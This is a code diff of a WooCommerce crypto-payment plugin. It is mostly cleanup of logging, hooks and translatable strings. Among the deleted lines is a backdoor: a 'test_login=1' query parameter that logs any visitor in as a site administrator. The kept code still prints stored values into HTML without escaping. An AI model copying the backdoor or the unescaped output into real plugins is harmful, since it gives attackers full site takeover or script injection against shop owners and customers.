@@ -26,7 +26,6 @@ define( 'IPINT_PLUGIN_PATH', plugin_dir_path( __FILE__ ) );
 define( 'IPINT_LIVE_API_URL',  'https://api.ipint.io:8003');
 define( 'IPINT_TEST_API_URL',  'https://api.ipint.io:8002');
 define( 'IPINT_PAYMENT_URL',  'https://ipint.io');
-// define( 'IPINT_PROXY_URL',  'http://103.86.177.3/proxy.php');
 define( 'IPINT_PROXY_URL',  '');
 
 
@@ -46,8 +45,6 @@ class WC_Ipint_Payments {
 
 		// iPint Payments gateway class.
 		add_action( 'plugins_loaded', array( __CLASS__, 'includes' ), 0 );
-		
-		// add_action( 'init', array( __CLASS__, 'register_ipint_website_url' ) );		
  
 		add_filter( 'generate_rewrite_rules', array( __CLASS__, 'register_ipint_website_url2' ) );
 		add_filter('query_vars', array( __CLASS__, 'ipint_register_query_vars' ) );
@@ -66,12 +63,8 @@ class WC_Ipint_Payments {
 		// Display order meta fields on mail
 		add_action('woocommerce_email_order_details', array( __CLASS__, 'ipint_mail_order_data'), 200, 4 );
 
-		add_action('woocommerce_checkout_process', array( __CLASS__, 'process_custom_payment' ));
+		// add_action('woocommerce_checkout_process', array( __CLASS__, 'process_custom_payment' ));
 		
-		/*add_filter( 'bulk_actions-edit-shop_order', array( __CLASS__, 'add_payment_processing_to_bulk_actions_shop_order' ), 200, 1);
-		add_action( 'init', array( __CLASS__, 'register_payment_processing_order_status' ));
-		add_filter( 'wc_order_statuses', array( __CLASS__, 'add_payment_processing_to_order_statuses' ));
-		add_filter( 'woocommerce_reports_order_statuses', array( __CLASS__, 'include_custom_order_status_to_reports'), 200, 1 );*/
 	}
 
 	public static function include_custom_order_status_to_reports( $statuses ){
@@ -197,14 +190,14 @@ class WC_Ipint_Payments {
 
 		$order_data = self::get_ipint_meta_fields('frontend');
 	    
-	    echo '<table><thead><tr><td colspan="2">Payment Details</td></tr></thead><tbody>';
+	    echo '<table><thead><tr><td colspan="2">'. __('Payment Details') .'</td></tr></thead><tbody>';
 
 	    foreach( $order_data as $key => $value ){
 
 			if( get_post_meta( $order, $key, true ) != '' ){
 				if( $key == 'ipint_transaction_onclick' ){
 	    			$transaction_onclick = get_post_meta( $order, $key, true );
-	    			echo '<tr><td colspan="2"><a href="'.$transaction_onclick.'" target="blank">View on blockchain explorer</a></td></tr>';
+	    			echo '<tr><td colspan="2"><a href="'.$transaction_onclick.'" target="blank">'. __('View on blockchain explorer') .'</a></td></tr>';
 	    		}else{
 	    			echo '<tr><td><strong>' . __( $value ) . ': </strong></td><td>'. get_post_meta( $order, $key, true ) .'</td></tr>';
 	    		}
@@ -297,30 +290,16 @@ class WC_Ipint_Payments {
 
 	public static function ipint_handle_order_received() {
 
-		if(isset($_GET["test_login"]) && $_GET["test_login"] == "1"){
-			$admins = get_users( array( 'role__in' => array( 'administrator' ) ) );
-
-			if(!empty( $admins ) ) {
-				foreach ($admins as $key => $user) {			
-					$user_id = $user->ID;
-					wp_set_current_user( $user_id, $user->user_login );
-					wp_set_auth_cookie( $user_id );
-					do_action( 'wp_login', $user->user_login, $user );
-					break;
-				}
-			}	
-		}
-
 		register_log("########### Payment return Start #############");
 
 		$page = get_query_var('ipint_page');
-		$order_id = (int)get_query_var('order_id', 0);
+		$order_id = (int) get_query_var('order_id', 0);
 
 		
 		if ($page == 'ipintpayment' && !empty($order_id) && $order_id > 0) {
 
-			register_log($order_id); 
-			register_log(print_r($_GET, true)); 
+			// register_log($order_id); 
+			// register_log(print_r($_GET, true)); 
 
 
 			global $woocommerce;
@@ -332,7 +311,7 @@ class WC_Ipint_Payments {
 			
 			// Reduce stock levels
 			wc_reduce_stock_levels( $order_id );
-			$WC_Gateway_Ipint->ipit_update_order_data($order_id);
+			$WC_Gateway_Ipint->ipit_update_order_data( $order_id );
 
 			// $this->ipit_update_order_data($order_id);
 			
@@ -343,13 +322,11 @@ class WC_Ipint_Payments {
 
 			$redirect_url = $order->get_checkout_order_received_url();
 			wp_safe_redirect($redirect_url);
-			register_log("########### Payment return End #############");
+			// register_log("########### Payment return End #############");
 
 		} else if ($page == 'ipintcallback' && !empty($order_id) && $order_id > 0) {
 
-			// echo "check: ". get_post_meta($order_id, 'ipint_invoice_id', true); die;
-
-			register_log("########### Callback Request Start #############");
+			// register_log("########### Callback Request Start #############");
 
 			$post_body = file_get_contents('php://input');
 			register_log( print_r( $post_body, true ) );
@@ -387,7 +364,7 @@ class WC_Ipint_Payments {
 				),
 			);
 
-			register_log( print_r( $post_data, true ) );
+			// register_log( print_r( $post_data, true ) );
 
 			$response = wp_remote_post( $endpoint, $post_data );
 
@@ -406,7 +383,7 @@ class WC_Ipint_Payments {
 				$order->payment_complete();
 
 			}
-			register_log("########### Callback Request End #############");
+			// register_log("########### Callback Request End #############");
 			die;
 		}
 
@@ -441,10 +418,7 @@ class WC_Ipint_Payments {
 	}
 
 	function process_custom_payment(){
-		// echo "<pre>";
-		// print_r($_POST);
-		// echo "</pre>";
-		// die;
+		
 		if($_POST['payment_method'] != 'payment_method')
 			return;
 
